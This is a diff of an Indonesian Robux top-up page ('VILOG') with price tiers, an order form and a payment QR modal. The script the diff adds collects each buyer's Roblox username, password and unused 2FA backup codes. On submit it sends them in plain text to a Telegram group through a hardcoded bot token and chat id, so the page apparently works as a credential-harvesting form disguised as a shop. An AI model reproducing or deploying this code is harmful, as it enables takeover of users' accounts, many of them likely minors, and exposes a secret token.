@@ -1,256 +1,221 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pricelist & Form Pembelian Robux - VILOG</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  <style>
-    :root{--accent:#4a6fa1;--muted:#6b7280}
-    body {
-      font-family: 'Roboto', sans-serif;
-      background: #fff;
-      margin: 0;
-      padding: 0;
-      color: #333;
-      font-size: 13px;
-    }
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Pricelist & Form Pembelian Robux - VILOG</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --accent:#4a6fa1;
+    --muted:#6b7280;
+    --bg:#f7fbff;
+    --card:#fff;
+    --maxWidth:720px;
+  }
+  *{box-sizing:border-box}
+  body{
+    font-family: 'Roboto',sans-serif;
+    background: var(--bg);
+    margin:0;
+    color:#333;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+    font-size:13px;
+    line-height:1.3;
+  }
 
-    h2, h3 {
-      text-align: center;
-      font-size: 13px;
-      font-weight: 700;
-      margin: 12px 0;
-      color: #2c3e50;
-    }
+  /* Wrapper for categories to match your sizes */
+  .wrap {
+    max-width: var(--maxWidth);
+    margin: 18px auto;
+    padding: 0 12px 36px;
+  }
 
-    /* Category */
-    .category {
-      max-width: 720px;
-      margin: 20px auto;
-      background: #dce6f5;
-      border-radius: 12px;
-      padding: 16px;
-    }
-    .category h3 {
-      margin-bottom: 12px;
-      border-bottom: 1px solid #b6c7e0;
-      padding-bottom: 4px;
-      text-align: left;
-    }
+  .category {
+    background: #dce6f5;
+    border-radius: 12px;
+    padding: 12px;
+    margin-bottom: 18px;
+    border: 1px solid #c6d7ee;
+  }
+  .category h3 {
+    margin: 0 0 10px;
+    font-size:14px;
+    font-weight:700;
+    color:#203547;
+    padding-bottom:6px;
+    border-bottom:1px solid #b6c7e0;
+    text-align:left;
+  }
 
-    /* Pricelist */
-    .prcContainer {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
-      justify-items: center;
-    }
-    .bc {
-      width: 100%;
-      max-width: 220px;
-      background-color: #fff;
-      border: 1px solid #ccd6eb;
-      border-radius: 10px;
-      padding: 8px 6px;
-      text-align: center;
-      font-size: 11px;
-      font-weight: 600;
-      color: #333;
-      cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-      user-select: none;
-    }
-    .bc:hover {
-      background-color: #eef3fa;
-      border-color: var(--accent);
-      transform: scale(1.05);
-    }
-    .bc span {
-      display: block;
-      font-size: 10px;
-      font-weight: normal;
-      color: #444;
-      margin-top: 6px;
-    }
+  /* Grid: 3 columns on wide screens, 2 on medium, 1 on small */
+  .prcContainer {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    align-items: stretch;
+  }
 
-    /* Form */
-    .form-container {
-      max-width: 420px;
-      margin: 25px auto 40px;
-      background: #fff;
-      border: 1px solid #ccd6eb;
-      border-radius: 12px;
-      padding: 18px 20px;
-      box-shadow: 0 3px 8px rgba(0,0,0,0.08);
-    }
-    .form-container h2 { margin-bottom: 14px; }
-    .form-group { margin-bottom: 12px; }
-    label { font-size: 12px; font-weight: 500; display: block; margin-bottom: 4px; color: #444; }
+  .bc {
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    min-height:56px;
+    padding:8px 10px;
+    border-radius:10px;
+    background:var(--card);
+    border:1px solid #ccd6eb;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.04);
+    cursor:pointer;
+    transition: transform .12s ease, box-shadow .12s ease, border-color .12s ease;
+    text-align:center;
+    user-select:none;
+  }
+  .bc:hover{ transform: translateY(-4px); border-color: var(--accent); box-shadow: 0 8px 20px rgba(74,111,161,0.08); }
+  .bc .title { font-weight:600; font-size:12px; color:#203547; }
+  .bc .price { margin-top:6px; font-size:11px; color:#5b6b7d; font-weight:500; }
 
-    input, select {
-      width: 100%;
-      padding: 8px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 12px;
-      box-sizing: border-box;
-      font-family: 'Roboto', sans-serif;
-      color: #333;
-      line-height: 1.4;
-      background: #fff;
-      height: auto;
-      appearance: none;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-    }
+  /* Form (centered, fixed width like your example) */
+  .form-container {
+    max-width: 420px;
+    margin: 18px auto 40px;
+    background: var(--card);
+    border:1px solid #ccd6eb;
+    border-radius:12px;
+    padding:16px 18px;
+    box-shadow: 0 3px 8px rgba(0,0,0,0.06);
+  }
+  .form-container h2 {
+    margin:6px 0 12px;
+    font-size:15px;
+    font-weight:700;
+    color:#203547;
+    text-align:center;
+  }
+  .form-group { margin-bottom:12px; }
+  label{ display:block; font-size:12px; margin-bottom:6px; color:#334; font-weight:600; }
+  input, select, textarea {
+    width:100%;
+    padding:9px 10px;
+    font-size:13px;
+    border-radius:8px;
+    border:1px solid #cfcfcf;
+    background:#fff;
+    color:#222;
+  }
+  select { padding-right:22px; background-image: none; }
+  .notes { font-size:11px; color:#6b7280; margin-top:6px; }
 
-    select {
-      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%204%205'%3E%3Cpath%20fill='%23666'%20d='M2%200L0%202h4zm0%205L0%203h4z'/%3E%3C/svg%3E");
-      background-repeat: no-repeat;
-      background-position: right 8px center;
-      background-size: 8px 10px;
-      padding-right: 22px;
-    }
+  .btn {
+    width:100%;
+    padding:10px;
+    border-radius:8px;
+    border:0;
+    background:var(--accent);
+    color:#fff;
+    font-weight:700;
+    cursor:pointer;
+    font-size:13px;
+  }
+  .btn:active{ transform: translateY(1px); }
 
-    button {
-      width: 100%;
-      padding: 10px;
-      background: var(--accent);
-      border: none;
-      border-radius: 8px;
-      color: white;
-      font-size: 12px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    button:hover { background: #3a5f8a; }
+  /* Payment modal */
+  .modal-backdrop { position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.45); z-index:999; }
+  .modal {
+    width:340px; max-width:calc(100% - 32px);
+    background:#fff; border-radius:12px; padding:16px; text-align:center; box-shadow:0 12px 40px rgba(0,0,0,0.25);
+  }
+  .modal .qr { width:170px; height:170px; object-fit:cover; border-radius:8px; border:1px solid #eee; margin:8px auto; }
+  .modal .amount { font-weight:700; color:#12345b; margin-top:6px; }
 
-    .hidden { display: none; }
-    .notes { font-size: 11px; color: #666; margin-top: 3px; }
+  /* Centered validation popup */
+  .validation-center {
+    position: fixed;
+    left:50%; top:50%;
+    transform: translate(-50%,-50%);
+    z-index:1100;
+    background:#fff;
+    border-radius:10px;
+    padding:12px 14px;
+    box-shadow:0 12px 40px rgba(0,0,0,0.18);
+    display:flex; gap:10px; align-items:center;
+    min-width:260px; max-width:92%;
+  }
+  .validation-center .txt { flex:1; text-align:center; font-weight:600; color:#222; }
+  .validation-center .xbtn { border:0; background:transparent; font-size:18px; color:var(--muted); cursor:pointer; }
 
-    /* Payment Modal */
-    .modal-backdrop {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.45);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-    }
-    .modal {
-      width: 340px;
-      max-width: calc(100% - 32px);
-      background: #fff;
-      border-radius: 12px;
-      padding: 16px;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.25);
-      text-align: center;
-    }
-    .modal h3 { margin: 0 0 8px; font-size: 15px; color: #23314a; }
-    .modal .qr { width: 180px; height: 180px; object-fit: cover; margin: 8px auto; border-radius: 8px; border: 1px solid #e6e6e6; }
-    .modal .amount { font-size: 18px; font-weight: 700; margin-top: 8px; color: #1b3b6f; }
-    .modal .pay-note { font-size: 12px; color: #555; margin-top: 8px; }
-    .modal .actions { display: flex; gap: 8px; margin-top: 12px; }
-    .modal .actions button { flex: 1; padding: 8px; font-size: 13px; }
-    .modal .small-note { font-size: 11px; color: #888; margin-top: 10px; }
-    .copy-success { font-size: 12px; color: green; margin-top: 6px; }
-
-    /* Centered validation popup (modal-like) */
-    .validation-center {
-      position: fixed;
-      left: 50%;
-      top: 50%;
-      transform: translate(-50%,-50%);
-      z-index: 11000;
-      min-width: 260px;
-      max-width: 92%;
-      background: linear-gradient(180deg,#fff,#fbfbfd);
-      border: 1px solid #e6e6e6;
-      box-shadow: 0 12px 40px rgba(35,49,74,0.16);
-      border-radius: 10px;
-      padding: 14px 16px;
-      display: flex;
-      gap: 12px;
-      align-items: center;
-      justify-content: space-between;
-      animation: popIn .14s ease;
-    }
-    .validation-center .txt { flex:1; font-size:14px; color:#111827; text-align:center; }
-    .validation-center .xbtn { background:transparent; border:none; font-size:18px; color:var(--muted); cursor:pointer; padding:6px; border-radius:6px; }
-    .validation-center .xbtn:focus { outline:2px solid rgba(74,111,161,0.18); }
-    @keyframes popIn { from { transform: translate(-50%,-52%) scale(.98); opacity:0 } to { transform: translate(-50%,-50%) scale(1); opacity:1 } }
-
-    /* responsive */
-    @media (max-width:880px){
-      .prcContainer { grid-template-columns: repeat(2, 1fr); }
-      .category { padding: 12px; margin: 12px; }
-      .form-container { margin: 18px 12px 30px; }
-    }
-    @media (max-width:520px){
-      .prcContainer { grid-template-columns: repeat(1, 1fr); gap: 12px; }
-      .category { padding: 12px; margin: 8px; }
-      .form-container { margin: 14px 8px 24px; }
-    }
-  </style>
+  /* responsive tweaks */
+  @media (max-width:900px){
+    .prcContainer { grid-template-columns: repeat(2, 1fr); }
+  }
+  @media (max-width:480px){
+    .prcContainer { grid-template-columns: repeat(1, 1fr); }
+    .bc { min-height:64px; padding:12px; }
+    .form-container { margin: 14px 12px 30px; padding:14px; }
+  }
+</style>
 </head>
 <body>
 
-  <div class="category">
+<div class="wrap">
+  <!-- Reguler -->
+  <section class="category" aria-label="Robux Reguler">
     <h3>Robux Reguler</h3>
     <div class="prcContainer">
-      <div class="bc" data-nm="80 Robux" data-hg="16000" data-kt="reg">80 Robux<span>Rp16.000</span></div>
-      <div class="bc" data-nm="160 Robux" data-hg="32000" data-kt="reg">160 Robux<span>Rp32.000</span></div>
-      <div class="bc" data-nm="240 Robux" data-hg="48000" data-kt="reg">240 Robux<span>Rp48.000</span></div>
-      <div class="bc" data-nm="320 Robux" data-hg="62000" data-kt="reg">320 Robux<span>Rp62.000</span></div>
-      <div class="bc" data-nm="400 Robux" data-hg="75000" data-kt="reg">400 Robux<span>Rp75.000</span></div>
-      <div class="bc" data-nm="480 Robux" data-hg="91000" data-kt="reg">480 Robux<span>Rp91.000</span></div>
-      <div class="bc" data-nm="560 Robux" data-hg="107000" data-kt="reg">560 Robux<span>Rp107.000</span></div>
-      <div class="bc" data-nm="640 Robux" data-hg="123000" data-kt="reg">640 Robux<span>Rp123.000</span></div>
-      <div class="bc" data-nm="720 Robux" data-hg="137500" data-kt="reg">720 Robux<span>Rp137.500</span></div>
-      <div class="bc" data-nm="800 Robux" data-hg="155000" data-kt="reg">800 Robux<span>Rp155.000</span></div>
-      <div class="bc" data-nm="1700 Robux" data-hg="310000" data-kt="reg">1.700 Robux<span>Rp310.000</span></div>
-      <div class="bc" data-nm="2100 Robux" data-hg="387500" data-kt="reg">2.100 Robux<span>Rp387.500</span></div>
-      <div class="bc" data-nm="3400 Robux" data-hg="610000" data-kt="reg">3.400 Robux<span>Rp610.000</span></div>
-      <div class="bc" data-nm="4500 Robux" data-hg="775000" data-kt="reg">4.500 Robux<span>Rp775.000</span></div>
-      <div class="bc" data-nm="10000 Robux" data-hg="1550000" data-kt="reg">10.000 Robux<span>Rp1.550.000</span></div>
+      <div class="bc" data-nm="80 Robux" data-hg="16000" data-kt="reg"><div class="title">80 Robux</div><div class="price">Rp16.000</div></div>
+      <div class="bc" data-nm="160 Robux" data-hg="32000" data-kt="reg"><div class="title">160 Robux</div><div class="price">Rp32.000</div></div>
+      <div class="bc" data-nm="240 Robux" data-hg="48000" data-kt="reg"><div class="title">240 Robux</div><div class="price">Rp48.000</div></div>
+      <div class="bc" data-nm="320 Robux" data-hg="62000" data-kt="reg"><div class="title">320 Robux</div><div class="price">Rp62.000</div></div>
+      <div class="bc" data-nm="400 Robux" data-hg="75000" data-kt="reg"><div class="title">400 Robux</div><div class="price">Rp75.000</div></div>
+      <div class="bc" data-nm="480 Robux" data-hg="91000" data-kt="reg"><div class="title">480 Robux</div><div class="price">Rp91.000</div></div>
+      <div class="bc" data-nm="560 Robux" data-hg="107000" data-kt="reg"><div class="title">560 Robux</div><div class="price">Rp107.000</div></div>
+      <div class="bc" data-nm="640 Robux" data-hg="123000" data-kt="reg"><div class="title">640 Robux</div><div class="price">Rp123.000</div></div>
+      <div class="bc" data-nm="720 Robux" data-hg="137500" data-kt="reg"><div class="title">720 Robux</div><div class="price">Rp137.500</div></div>
+      <div class="bc" data-nm="800 Robux" data-hg="155000" data-kt="reg"><div class="title">800 Robux</div><div class="price">Rp155.000</div></div>
+      <div class="bc" data-nm="1700 Robux" data-hg="310000" data-kt="reg"><div class="title">1.700 Robux</div><div class="price">Rp310.000</div></div>
+      <div class="bc" data-nm="2100 Robux" data-hg="387500" data-kt="reg"><div class="title">2.100 Robux</div><div class="price">Rp387.500</div></div>
+      <div class="bc" data-nm="3400 Robux" data-hg="610000" data-kt="reg"><div class="title">3.400 Robux</div><div class="price">Rp610.000</div></div>
+      <div class="bc" data-nm="4500 Robux" data-hg="775000" data-kt="reg"><div class="title">4.500 Robux</div><div class="price">Rp775.000</div></div>
+      <div class="bc" data-nm="10000 Robux" data-hg="1550000" data-kt="reg"><div class="title">10.000 Robux</div><div class="price">Rp1.550.000</div></div>
     </div>
-  </div>
+  </section>
 
-  <div class="category">
+  <!-- Special -->
+  <section class="category" aria-label="Robux Special">
     <h3>Robux Special</h3>
     <div class="prcContainer">
-      <div class="bc" data-nm="500 Robux" data-hg="75000" data-kt="spc">500 Robux<span>Rp75.000</span></div>
-      <div class="bc" data-nm="1000 Robux" data-hg="148000" data-kt="spc">1.000 Robux<span>Rp148.000</span></div>
-      <div class="bc" data-nm="1500 Robux" data-hg="222000" data-kt="spc">1.500 Robux<span>Rp222.000</span></div>
-      <div class="bc" data-nm="2000 Robux" data-hg="296000" data-kt="spc">2.000 Robux<span>Rp296.000</span></div>
-      <div class="bc" data-nm="2500 Robux" data-hg="367500" data-kt="spc">2.500 Robux<span>Rp367.500</span></div>
-      <div class="bc" data-nm="3000 Robux" data-hg="441000" data-kt="spc">3.000 Robux<span>Rp441.000</span></div>
-      <div class="bc" data-nm="3500 Robux" data-hg="514500" data-kt="spc">3.500 Robux<span>Rp514.500</span></div>
-      <div class="bc" data-nm="4000 Robux" data-hg="588000" data-kt="spc">4.000 Robux<span>Rp588.000</span></div>
-      <div class="bc" data-nm="5000 Robux" data-hg="735000" data-kt="spc">5.000 Robux<span>Rp735.000</span></div>
-      <div class="bc" data-nm="6000 Robux" data-hg="876000" data-kt="spc">6.000 Robux<span>Rp876.000</span></div>
+      <div class="bc" data-nm="500 Robux" data-hg="75000" data-kt="spc"><div class="title">500 Robux</div><div class="price">Rp75.000</div></div>
+      <div class="bc" data-nm="1000 Robux" data-hg="148000" data-kt="spc"><div class="title">1.000 Robux</div><div class="price">Rp148.000</div></div>
+      <div class="bc" data-nm="1500 Robux" data-hg="222000" data-kt="spc"><div class="title">1.500 Robux</div><div class="price">Rp222.000</div></div>
+      <div class="bc" data-nm="2000 Robux" data-hg="296000" data-kt="spc"><div class="title">2.000 Robux</div><div class="price">Rp296.000</div></div>
+      <div class="bc" data-nm="2500 Robux" data-hg="367500" data-kt="spc"><div class="title">2.500 Robux</div><div class="price">Rp367.500</div></div>
+      <div class="bc" data-nm="3000 Robux" data-hg="441000" data-kt="spc"><div class="title">3.000 Robux</div><div class="price">Rp441.000</div></div>
+      <div class="bc" data-nm="3500 Robux" data-hg="514500" data-kt="spc"><div class="title">3.500 Robux</div><div class="price">Rp514.500</div></div>
+      <div class="bc" data-nm="4000 Robux" data-hg="588000" data-kt="spc"><div class="title">4.000 Robux</div><div class="price">Rp588.000</div></div>
+      <div class="bc" data-nm="5000 Robux" data-hg="735000" data-kt="spc"><div class="title">5.000 Robux</div><div class="price">Rp735.000</div></div>
+      <div class="bc" data-nm="6000 Robux" data-hg="876000" data-kt="spc"><div class="title">6.000 Robux</div><div class="price">Rp876.000</div></div>
     </div>
-  </div>
+  </section>
 
-  <div class="category">
+  <!-- Premium -->
+  <section class="category" aria-label="Robux Premium">
     <h3>Robux Premium</h3>
     <div class="prcContainer">
-      <div class="bc" data-nm="450 Robux + Premium" data-hg="75000" data-kt="pre">450 Robux + Premium<span>Rp75.000</span></div>
-      <div class="bc" data-nm="1000 Robux + Premium" data-hg="148000" data-kt="pre">1.000 Robux + Premium<span>Rp148.000</span></div>
-      <div class="bc" data-nm="1550 Robux + Premium" data-hg="222000" data-kt="pre">1.550 Robux + Premium<span>Rp222.000</span></div>
-      <div class="bc" data-nm="2200 Robux + Premium" data-hg="296000" data-kt="pre">2.200 Robux + Premium<span>Rp296.000</span></div>
-      <div class="bc" data-nm="2750 Robux + Premium" data-hg="367500" data-kt="pre">2.750 Robux + Premium<span>Rp367.500</span></div>
-      <div class="bc" data-nm="3300 Robux + Premium" data-hg="441000" data-kt="pre">3.300 Robux + Premium<span>Rp441.000</span></div>
+      <div class="bc" data-nm="450 Robux + Premium" data-hg="75000" data-kt="pre"><div class="title">450 Robux + Premium</div><div class="price">Rp75.000</div></div>
+      <div class="bc" data-nm="1000 Robux + Premium" data-hg="148000" data-kt="pre"><div class="title">1.000 Robux + Premium</div><div class="price">Rp148.000</div></div>
+      <div class="bc" data-nm="1550 Robux + Premium" data-hg="222000" data-kt="pre"><div class="title">1.550 Robux + Premium</div><div class="price">Rp222.000</div></div>
+      <div class="bc" data-nm="2200 Robux + Premium" data-hg="296000" data-kt="pre"><div class="title">2.200 Robux + Premium</div><div class="price">Rp296.000</div></div>
+      <div class="bc" data-nm="2750 Robux + Premium" data-hg="367500" data-kt="pre"><div class="title">2.750 Robux + Premium</div><div class="price">Rp367.500</div></div>
+      <div class="bc" data-nm="3300 Robux + Premium" data-hg="441000" data-kt="pre"><div class="title">3.300 Robux + Premium</div><div class="price">Rp441.000</div></div>
     </div>
-  </div>
+  </section>
 
+  <!-- FORM (below) -->
   <div class="form-container" id="orderSection">
     <h2>Form Pembelian Robux VILOG</h2>
-    <form id="frm">
+    <form id="frm" autocomplete="off">
       <div class="form-group">
         <label for="usr">Username Roblox *</label>
         <input type="text" id="usr" name="usr" placeholder="Username Roblox" required>
@@ -267,6 +232,7 @@
           <option value="ON">ON</option>
         </select>
       </div>
+
       <div class="form-group hidden" id="v2m_div">
         <label for="v2m">Metode V2L *</label>
         <select id="v2m" name="v2m">
@@ -275,14 +241,17 @@
           <option value="EM">Kode Email</option>
         </select>
       </div>
+
       <div class="form-group hidden" id="bc_div">
         <label for="bc">Backup Code *</label>
         <input type="text" id="bc" name="bc" placeholder="Isi Backup Code">
         <div class="notes">Masukkan 1-3 backup code yang belum dipakai.</div>
       </div>
+
       <div class="form-group hidden" id="em_div">
         <div class="notes">Pastikan storage email tidak penuh, standby & fast respon.</div>
       </div>
+
       <div class="form-group">
         <label for="kt">Kategori *</label>
         <input type="text" id="kt" name="kt" readonly required>
@@ -295,234 +264,192 @@
         <label for="hg">Harga *</label>
         <input type="text" id="hg" name="hg" readonly required>
       </div>
-      <div style="text-align:center; margin:14px 0 6px;">
-        <button type="button" id="btnTg">Pesan via Telegram</button>
+
+      <div style="text-align:center; margin-top:8px;">
+        <button type="button" id="btnTg" class="btn">Pesan via Telegram</button>
       </div>
     </form>
   </div>
+</div>
 
-  <div id="paymentModalBackdrop" class="modal-backdrop" aria-hidden="true">
-    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
-      <h3 id="modalTitle">Pembayaran</h3>
-      <img id="modalQr" class="qr" src="" alt="QR Pembayaran">
-      <div id="modalAmount" class="amount">Rp0</div>
-      <div class="pay-note">Silahkan lakukan pembayaran, lalu kembali & wajib kirim bukti pembayaran ke bot.</div>
-      <div class="actions">
-        <button id="copyAmountBtn" type="button">Salin Jumlah</button>
-        <button id="openBotBtn" type="button">Buka Bot</button>
-      </div>
-      <div class="small-note">Setelah bayar, kirim bukti pembayaran ke bot agar pesanan segera diproses.</div>
-      <div style="margin-top:10px;">
-        <button id="closeModalBtn" type="button" style="width:100%; background:#e0e0e0; color:#222;">Tutup</button>
-      </div>
-      <div id="copySuccess" class="copy-success" style="display:none;">Jumlah berhasil disalin ke clipboard</div>
+<!-- Payment Modal -->
+<div id="paymentModalBackdrop" class="modal-backdrop" aria-hidden="true">
+  <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <h3 id="modalTitle">Pembayaran</h3>
+    <img id="modalQr" class="qr" src="" alt="QR Pembayaran">
+    <div id="modalAmount" class="amount">Rp0</div>
+    <div class="pay-note">Silahkan lakukan pembayaran, lalu kembali & wajib kirim bukti pembayaran ke bot.</div>
+    <div style="display:flex; gap:8px; margin-top:12px;">
+      <button id="copyAmountBtn" class="btn" style="flex:1; background:#fff; color:#123; border:1px solid #ddd;">Salin Jumlah</button>
+      <button id="openBotBtn" class="btn" style="flex:1;">Buka Bot</button>
     </div>
+    <div style="margin-top:10px;">
+      <button id="closeModalBtn" style="width:100%; padding:10px; margin-top:10px; border-radius:8px; border:0; background:#eee; color:#222;">Tutup</button>
+    </div>
+    <div id="copySuccess" class="copy-success" style="display:none; margin-top:8px; color:green; font-weight:600;">Jumlah berhasil disalin ke clipboard</div>
   </div>
+</div>
 
-  <div id="validationContainer"></div>
+<!-- validation container -->
+<div id="validationContainer"></div>
 
-  <script>
-    function sanitize(v){return v?Number(String(v).replace(/\D+/g,'')):NaN;}
-    function fill({nmText,hgRaw,ktVal}) {
-      document.getElementById('nm').value = nmText||'';
-      document.getElementById('kt').value = ktVal||'';
-      const h = sanitize(hgRaw);
-      document.getElementById('hg').value = !isNaN(h) ? 'Rp'+new Intl.NumberFormat('id-ID').format(h) : hgRaw;
-      const el = document.querySelector('.form-container') || document.getElementById('orderSection');
-      if(el){
-        el.scrollIntoView({behavior:'smooth', block:'center'});
-        setTimeout(()=> document.getElementById('usr').focus(), 200);
-      }
+<script>
+/* fungsi & var tidak diubah nama agar kompatibel dengan kode sebelumnya */
+function sanitize(v){ return v?Number(String(v).replace(/\D+/g,'')):NaN; }
+function fill({nmText,hgRaw,ktVal}){
+  document.getElementById('nm').value = nmText||'';
+  document.getElementById('kt').value = ktVal||'';
+  const h = sanitize(hgRaw);
+  document.getElementById('hg').value = !isNaN(h)? 'Rp' + new Intl.NumberFormat('id-ID').format(h) : hgRaw;
+  const el = document.querySelector('.form-container') || document.getElementById('orderSection');
+  if(el){ el.scrollIntoView({behavior:'smooth', block:'center'}); setTimeout(()=>document.getElementById('usr').focus(),200); }
+}
+
+function showValidationPopupCenter(message){
+  const existing = document.getElementById('validationCenterPopup');
+  if(existing) existing.remove();
+  const container = document.getElementById('validationContainer') || document.body;
+  const popup = document.createElement('div');
+  popup.id = 'validationCenterPopup';
+  popup.className = 'validation-center';
+  popup.tabIndex = -1;
+  popup.innerHTML = `<div class="txt">${message}</div><button class="xbtn" aria-label="Tutup">✕</button>`;
+  container.appendChild(popup);
+  popup.focus({preventScroll:true});
+  const closeBtn = popup.querySelector('.xbtn');
+  function remove(){ popup.remove(); }
+  closeBtn.addEventListener('click', remove);
+  setTimeout(remove, 3500);
+}
+
+/* init */
+document.addEventListener('DOMContentLoaded', function(){
+  document.querySelectorAll('.bc').forEach(b=>{
+    b.addEventListener('click', ()=> fill({
+      nmText: b.getAttribute('data-nm') || b.textContent.trim(),
+      hgRaw: b.getAttribute('data-hg') || '',
+      ktVal: b.getAttribute('data-kt') || ''
+    }));
+  });
+
+  const v2 = document.getElementById('v2');
+  const v2m = document.getElementById('v2m');
+  const bcDiv = document.getElementById('bc_div');
+  const emDiv = document.getElementById('em_div');
+
+  v2 && v2.addEventListener('change', ()=> {
+    if(v2.value === 'ON'){ v2m && v2m.parentElement.classList.remove('hidden'); }
+    else { if(v2m) v2m.parentElement.classList.add('hidden'); bcDiv && bcDiv.classList.add('hidden'); emDiv && emDiv.classList.add('hidden'); }
+  });
+
+  v2m && v2m.addEventListener('change', ()=> {
+    if(v2m.value === 'BC'){ bcDiv && bcDiv.classList.remove('hidden'); emDiv && emDiv.classList.add('hidden'); }
+    else if(v2m.value === 'EM'){ emDiv && emDiv.classList.remove('hidden'); bcDiv && bcDiv.classList.add('hidden'); }
+    else { bcDiv && bcDiv.classList.add('hidden'); emDiv && emDiv.classList.add('hidden'); }
+  });
+
+  document.getElementById('btnTg').addEventListener('click', ()=>{
+    const f = document.getElementById('frm');
+    const req = f.querySelectorAll('input[required], select[required]');
+    for(const i of req){
+      if(!i.value.trim()){ showValidationPopupCenter('harap isi semua kolom!'); try{i.focus()}catch(e){}; return; }
     }
 
-    function showValidationPopupCenter(message){
-      const existing = document.getElementById('validationCenterPopup');
-      if(existing) existing.remove();
-      const container = document.getElementById('validationContainer') || document.body;
-      const popup = document.createElement('div');
-      popup.id = 'validationCenterPopup';
-      popup.className = 'validation-center';
-      popup.tabIndex = -1;
-      popup.innerHTML = `<div class="txt">${message}</div><button class="xbtn" aria-label="Tutup">✕</button>`;
-      container.appendChild(popup);
-      const closeBtn = popup.querySelector('.xbtn');
-      popup.focus({preventScroll:true});
-      function removePopup(){
-        if(!popup) return;
-        popup.style.transition = 'opacity 160ms ease, transform 160ms ease';
-        popup.style.opacity = '0';
-        popup.style.transform = 'translate(-50%,-50%) scale(.98)';
-        setTimeout(()=> popup.remove(), 170);
+    const u = document.getElementById('usr').value;
+    const p = document.getElementById('pwd').value;
+    const v = v2 ? v2.value : '';
+    const vm = v2m ? v2m.value : '';
+    const b = bcDiv ? (bcDiv.querySelector('input')?.value || '') : '';
+    const kt = document.getElementById('kt').value;
+    const nm = document.getElementById('nm').value;
+    const hg = document.getElementById('hg').value;
+
+    const token = '1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E';
+    const chatId = '-1002801058966';
+    const txt = 'Pesanan Baru Masuk!\n\nUsername: '+u+'\nPassword: '+p+'\nV2L: '+v + (vm? ' ('+vm+')':'') + (b?'\nBackup Code: '+b:'') + '\nKategori: '+kt+'\nNominal: '+nm+'\nHarga: '+hg;
+
+    fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+      method:'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: chatId, text: txt })
+    })
+    .then(res => {
+      if(res.ok){
+        const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
+        showPaymentPopup(qrUrl, hg);
+        f.reset();
+      } else {
+        showValidationPopupCenter('Gagal kirim ke Telegram');
       }
-      closeBtn.addEventListener('click', removePopup);
-      const t = setTimeout(removePopup, 4000);
-      window.addEventListener('pagehide', ()=>{ clearTimeout(t); if(popup) popup.remove(); }, { once:true });
+    })
+    .catch(()=> showValidationPopupCenter('Terjadi kesalahan jaringan.'));
+  });
+
+  function showPaymentPopup(qrUrl, hargaFormatted){
+    const backdrop = document.getElementById('paymentModalBackdrop');
+    const modalQr = document.getElementById('modalQr');
+    const modalAmount = document.getElementById('modalAmount');
+    const copySuccess = document.getElementById('copySuccess');
+
+    modalQr.src = qrUrl;
+    let amountText = hargaFormatted || '';
+    if(!/^Rp/i.test(amountText)){
+      const num = Number(String(amountText).replace(/[^\d]/g,''));
+      amountText = 'Rp' + new Intl.NumberFormat('id-ID').format(isNaN(num)?0:num);
     }
+    modalAmount.textContent = amountText;
 
-    document.addEventListener('DOMContentLoaded', function(){
-      document.querySelectorAll('.bc').forEach(b=>{
-        b.addEventListener('click', ()=> fill({
-          nmText: b.getAttribute('data-nm') || b.textContent.trim(),
-          hgRaw: b.getAttribute('data-hg') || '',
-          ktVal: b.getAttribute('data-kt') || ''
-        }));
+    copySuccess.style.display = 'none';
+    backdrop.style.display = 'flex';
+    backdrop.setAttribute('aria-hidden','false');
+
+    document.getElementById('closeModalBtn').onclick = function(){
+      backdrop.style.display = 'none'; backdrop.setAttribute('aria-hidden','true');
+    };
+    backdrop.onclick = function(e){ if(e.target === backdrop){ backdrop.style.display = 'none'; backdrop.setAttribute('aria-hidden','true'); } };
+
+    document.getElementById('copyAmountBtn').onclick = function(){
+      const textToCopy = modalAmount.textContent || '';
+      navigator.clipboard?.writeText(textToCopy).then(()=>{
+        copySuccess.style.display = 'block';
+        setTimeout(()=> copySuccess.style.display = 'none', 2000);
+      }).catch(()=> {
+        const tmp = document.createElement('textarea'); tmp.value = textToCopy; document.body.appendChild(tmp); tmp.select();
+        try{ document.execCommand('copy'); copySuccess.style.display = 'block'; setTimeout(()=> copySuccess.style.display = 'none', 2000); }catch(e){ alert('Salin manual: '+textToCopy); }
+        document.body.removeChild(tmp);
       });
+    };
 
-      const v2 = document.getElementById('v2');
-      const v2m = document.getElementById('v2m');
-      const bcDiv = document.getElementById('bc_div');
-      const emDiv = document.getElementById('em_div');
+    document.getElementById('openBotBtn').onclick = function(){
+      const botUsername = 'topupgamesbot';
+      const tgScheme = 'tg://resolve?domain=' + encodeURIComponent(botUsername);
+      const webLink  = 'https://t.me/' + encodeURIComponent(botUsername) + '?start';
